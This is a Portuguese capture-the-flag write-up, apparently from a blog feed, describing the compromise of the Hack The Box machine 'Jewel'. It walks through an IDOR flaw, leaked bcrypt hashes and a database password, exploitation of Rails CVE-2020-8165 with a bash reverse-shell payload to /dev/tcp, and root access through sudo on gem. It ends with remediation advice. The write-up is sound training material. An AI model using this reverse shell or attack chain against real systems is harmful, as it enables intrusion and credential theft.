<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">10.10.10.211  jewel.htb
</code></pre></div><p>Desta forma as aplicações podem ser acessadas pelo browser com as seguintes URLs.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">http://jewel.htb:8080/
http://jewel.htb:8000/gitweb/
</code></pre></div><h2 id="vulnerabilidades">Vulnerabilidades</h2>
<p>O sistema permite visualizar o perfil de outros usuários, sendo necessário apenas alterar a id do usuário na URL. Com isto foi possível obter o nome de usuário bill (id=01) e jennifer (id=02).</p>

    <img src="https://i.imgur.com/gEeZYw6.png"  alt="Blog"  class="center"  style="border-radius: 8px;"  />


<p>Além de poder visualizar os dados de outros usuários é possível alterar suas publicações e o campo de texto é vulnerável a HTML Injection.</p>

    <img src="https://i.imgur.com/0q4O6JU.png"  alt="HTML Injection"  class="center"  style="border-radius: 8px;"  />


<p>Analisando o código fonte do HTML foi encontrado o campo de senha comentado no form de usuário. Descomentando o código torna-se possível a alteração de senha do usuário.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;form-group&#34;</span>&gt;
    &lt;<span style="color:#f92672">label</span> <span style="color:#a6e22e">for</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;user_password&#34;</span>&gt;Password&lt;/<span style="color:#f92672">label</span>&gt;
    &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;form-control&#34;</span> <span style="color:#a6e22e">placeholder</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Password&#34;</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;password&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;user[password]&#34;</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;user_password&#34;</span> /&gt;
&lt;/<span style="color:#f92672">div</span>&gt;
</code></pre></div><p>Como se trata de uma aplicação onde o código fonte do &lsquo;Blog&rsquo; é gerenciado pelo Git, é possível navegar pela página e obter informações sobre a linguagem de programação (Ruby), o framework utilizado (Ruby on Rails) e suas versões.</p>

    <img src="https://i.imgur.com/LF5vrJr.png"  alt="Commit"  class="center"  style="border-radius: 8px;"  />


<p>Obtendo as credenciais na tabela users.</p>

    <img src="https://i.imgur.com/UDDE3iO.png"  alt="Credentials"  class="center"  style="border-radius: 8px;"  />


<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">bill  bill@mail.htb  2020-08-25 08:13:58.662464  2020-08-25 08:13:58.662464     
$2a$12$uhUssB8.HFpT4XpbhclQU.Oizufehl9qqKtmdxTXetojn2FcNncJW

jennifer  jennifer@mail.htb  2020-08-25 08:54:42.8483  2020-08-25 08:54:42.8483        
$2a$12$ik.0o.TGRwMgUmyOR.Djzuyb/hjisgk2vws1xYC/hxw8M1nFk0MQy
</code></pre></div><p>Ao executar o Linpeas no host mais credenciais foram descobertas.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">[+] Finding &#39;pwd&#39; or &#39;passw&#39; variables (and interesting php db definitions) inside /home /var/www /var/backups /tmp /etc /root /mnt (limit 70)
/home/bill/blog/config/database.yml:  password: beiw,aDoed1

[+] Searching specific hashes inside files - less false positives (limit 70)
/var/backups/dump_2020-08-27.sql:$2a$12$sZac9R2VSQYjOcBTTUYy6.Zd.5I02OnmkKnD3zA6MqMrzLKz0jeDO
/home/bill/blog/bd.sql:$2a$12$uhUssB8.HFpT4XpbhclQU.Oizufehl9qqKtmdxTXetojn2FcNncJW
</code></pre></div><p>Conteúdo do arquivo /home/bill/blog/config/database.yml.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">production:
  &lt;&lt;: *default
  database: blog_development
  host: localhost
  port: 5432
  username: rails_dev
  password: beiw,aDoed1
</code></pre></div><p>Os dados do banco de dados PostgreSQL também estão expostos. No arquivo bd.sql a versão do banco e suas tabelas podem ser visualizadas.</p>

    <img src="https://i.imgur.com/qj8LYnT.png"  alt="bd.sql"  class="center"  style="border-radius: 8px;"  />


<p>Estrutura de tabelas no dump db.sql.</p>

    <img src="https://i.imgur.com/xVLzmr6.png"  alt="bd.sql"  class="center"  style="border-radius: 8px;"  />


<p>Também foi possível encontrar a versão do Ruby e do Gem (Gerenciador de Pacotes do Ruby).</p>

    <img src="https://i.imgur.com/cS79HSr.png"  alt="Ruby Version"  class="center"  style="border-radius: 8px;"  />


<p>De posse das credenciais obtidas, nome de usuário e &lsquo;hashes&rsquo;, foi utilizado o hashcat para identificar o tipo de hash utilizado para o campo de senha. De acordo com o hashcat trata-se de uma hash bcrypt.</p>

    <img src="https://i.imgur.com/fbU36GI.png"  alt="Hashcat"  class="center"  style="border-radius: 8px;"  />


<p>Com o john foi possível quebrar o &lsquo;hash&rsquo; do usuário bill. A senha revelada é &lsquo;spongebob&rsquo;.</p>

    <img src="https://i.imgur.com/nPlJmyJ.png"  alt="John"  class="center"  style="border-radius: 8px;"  />


<p>Pesquisando por vulnerabilidades na versão 5.2.2.1 do Rails foi descoberta a <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-8165">CVE-2020-8165</a> no site <a href="https://cve.mitre.org/">mitre.org</a>.</p>

    <img src="https://i.imgur.com/bRgeBwk.png"  alt="CVE-2020-8165"  class="center"  style="border-radius: 8px;"  />


<p>Trata-se de uma vulnerabilidade de desserialização de dados não confiáveis que existe nas versões do Rails &lt;5.2.4.3, Rails &lt;6.0.3.1 e que pode permitir que um invasor desempacote objetos fornecidos pelo usuário em MemCacheStore e RedisCacheStore, resultando potencialmente em um RCE (Remote Code Execution).</p>
<h2 id="exploração">Exploração</h2>
<p>Buscando por exploits para a <a href="https://github.com/masahiro331/CVE-2020-8165">CVE-2020-8165</a> foi encontrado no <a href="https://github.com/">github</a> um exploit público.</p>

    <img src="https://i.imgur.com/uUSwT37.png"  alt="Pesquisa de Exploits"  class="center"  style="border-radius: 8px;"  />


<p>O exploit consiste em encodar uma string de comando que será o payload a ser enviado ao servidor. O envio do payload é efetuado duas vezes usando o curl e o alvo utilizado é a página de cadastro de usuário.</p>
<p>Para obter uma shell reversa o IP e porta no payload devem ser configurados conforme a máquina do atacante. O resultado será uma URL codificada, que pode ser usada no envio do cadastro de usuário através da interceptação da requisição com o Burp Suite. Ou diretamente com o curl, enviando duas requisições seguidas, conforme orientação do manual do exploit.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">irb(main):&gt; code = &#39;`/bin/bash -c &#34;bash -i &gt;&amp; /dev/tcp/&lt;ip&gt;/&lt;port&gt; 0&gt;&amp;1&#34;`&#39;
</code></pre></div><p>Obtendo a shell reversa.</p>

    <img src="https://i.imgur.com/yFVyS2Y.png"  alt="Reverse Shell"  class="center"  style="border-radius: 8px;"  />


<p>Obtendo a flag do usuário bill.</p>

    <img src="https://i.imgur.com/8hWl8Wx.png"  alt="User Key"  class="center"  style="border-radius: 8px;"  />


<h2 id="escalação-de-privilégios">Escalação de Privilégios</h2>
<p>Após executar o exploit com o payload e receber a shell reversa foi possível analisar o conteúdo do diretório do usuário bill. Neste diretório foi encontrado o arquivo oculto do Google Authenticator.</p>

    <img src="https://i.imgur.com/PVwPiZF.png"  alt="Diretório Bill"  class="center"  style="border-radius: 8px;"  />


<p>Ao tentar executar algum comando com o &lsquo;sudo&rsquo; utilizando este usuário surge a solicitação do código de autenticação do <a href="https://github.com/google/google-authenticator/wiki">Google Authenticator</a> (verificação em duas etapas).</p>
<p>O código de verificação pode ser obtido com o addon <a href="https://addons.mozilla.org/pt-BR/firefox/addon/auth-helper/">Authenticator</a> instalado no browser.</p>
<p>Para utilizar o código gerado a data e horário do host devem estar sincronizados com a máquina do atacante. Para isto é necessário desabilitar o NTP de fuso-horário automático e setar a hora manualmente, de acordo com a hora e minutos da máquina Jewel.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ timedatectl set-ntp false
$ sudo timedatectl set-time <span style="color:#e6db74">&#39;2020-10-26 22:34:18&#39;</span>
</code></pre></div><p>Após efetuar a sincronização e gerar o código de verificação com o addon Authenticator é possível autenticar com as credenciais bill:spongebob e checar que tipo de permissões possui o usuário.</p>

    <img src="https://i.imgur.com/nX6brom.png"  alt="Sudo"  class="center"  style="border-radius: 8px;"  />


<p>O usuário bill possui privilégios de root no gem (gerenciador de pacotes do Ruby).</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">(ALL : ALL) /usr/bin/gem
</code></pre></div><p>Buscando no <a href="https://gtfobins.github.io/">GTFOBins</a> é possível encontrar a forma de escalar privilégios com o gem usando o sudo.</p>

    <img src="https://i.imgur.com/QkM9UxI.png"  alt="GTFOBins"  class="center"  style="border-radius: 8px;"  />


<p>Obtenção de root após a execução do comando com o sudo.</p>

    <img src="https://i.imgur.com/TfwyjMs.png"  alt="Privesc"  class="center"  style="border-radius: 8px;"  />


<p>Obtendo a flag do usuário root.</p>

    <img src="https://i.imgur.com/xp0tPmt.png"  alt="Flag Root"  class="center"  style="border-radius: 8px;"  />


<h2 id="recomendações">Recomendações</h2>
<p>Caso fosse um Pentest realizado para alguma empresa, estas seriam as recomendações para solucionar os problemas encontrados no host.</p>
<ul>
<li>Implementar um sistema de permissão de acesso à aplicação &lsquo;gitweb&rsquo;. Deve ser de uso restrito dos desenvolvedores do sistema e não deve estar acessível para qualquer usuário. Outra opção é remover a sua disponibilidade.</li>
<li>Implementar a verificação de sessão de usuário na aplicação &lsquo;Blog&rsquo; para impedir que um usuário logado possa visualizar os dados de outros usuários.</li>
<li>Revisão de código fonte da aplicação &lsquo;Blog&rsquo; para remover código comentado que possa comprometer a segurança do sistema.</li>
<li>Implementar validação dos dados enviados nos dois lados da aplicação &lsquo;Blog&rsquo;, tanto no front-end quanto no back-end, para evitar o envio de dados maliciosos ao servidor.</li>
<li>Atualizar o software utilizado para o desenvolvimento do sistema e suas dependências.</li>
</ul>
]]></content>
        </item>
        
    </channel>
</rss>
